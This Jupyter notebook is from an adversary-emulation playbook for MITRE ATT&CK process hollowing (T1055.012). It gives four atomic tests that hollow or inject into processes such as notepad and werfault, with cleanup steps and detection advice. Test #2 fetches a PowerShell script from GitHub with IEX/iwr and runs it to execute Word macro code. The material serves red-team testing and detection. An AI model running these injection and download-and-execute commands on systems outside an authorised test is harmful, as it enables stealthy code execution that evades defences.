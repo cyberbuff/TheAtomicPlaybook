{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "9ca0ead0",
   "metadata": {},
   "source": "# T1055.012 - Process Hollowing\nAdversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. "
  },
  {
   "cell_type": "markdown",
   "id": "cd32d562",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "ea067f4e",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Process Hollowing using PowerShell",
    "This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n. \"$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1\"\n$ppid=Get-Process explorer | select -expand id\nStart-Hollow -Sponsor \"C:\\Windows\\System32\\notepad.exe\" -Hollow \"C:\\Windows\\System32\\cmd.exe\" -ParentPID $ppid -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5d4cfa7e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055.012 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "d2c9b91e",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name \"notepad\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "355dfba7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055.012 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d62fcc2b",
   "metadata": {},
   "source": "### Atomic Test #2 - RunPE via VBA\nThis module executes notepad.exe from within the WINWORD.EXE process\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Microsoft #{ms_product} must be installed\n\n##### Check Prereq Commands:\n```powershell\ntry {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  $process = \"Word\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e85b9e41",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055.012 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "2450cb82",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"Word\" -sub \"Exploit\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1dd6cb47",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055.012 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "cd845dce",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Process Hollowing in Go using CreateProcessW WinAPI",
    "Creates a process in a suspended state, executes shellcode to spawn calc.exe in a child process, and then resumes the original process.\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocess)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcess.exe -program \"C:\\Windows\\System32\\werfault.exe\" -debug\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b2931dce",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055.012 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "05a2416a",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name \"werfault\" -ErrorAction SilentlyContinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "47937cb0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055.012 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "82da8f04",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Process Hollowing in Go using CreateProcessW and CreatePipe WinAPIs (T1055.012)",
    "Create a process in a suspended state, execute shellcode to spawn calc.exe in a child process, and then resume the original process.\nThis test uses the CreatePipe function to create an anonymous pipe that parent and child processes can communicate over. This anonymous pipe\nallows for the retrieval of output generated from executed shellcode.\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocesswithpipe)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcessWithPipe.exe -program \"C:\\Windows\\System32\\werfault.exe\" -debug\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c8adc95d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055.012 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "478c22f9",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Process -Name CalculatorApp -ErrorAction SilentlyContinue\nStop-Process -Name \"werfault\" -ErrorAction SilentlyContinue```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4e2647cd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1055.012 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a4370300",
   "metadata": {},
   "source": "## Detection\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nProcessing hollowing commonly involves spawning an otherwise benign victim process. Consider correlating detections of processes created in a suspended state (ex: through API flags or process\u2019 thread metadata) with other malicious activity such as attempts to modify a process' memory, especially by its parent process, or other abnormal process behavior.(Citation: Nviso Spoof Command Line 2020)(Citation: Mandiant Endpoint Evading 2019)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}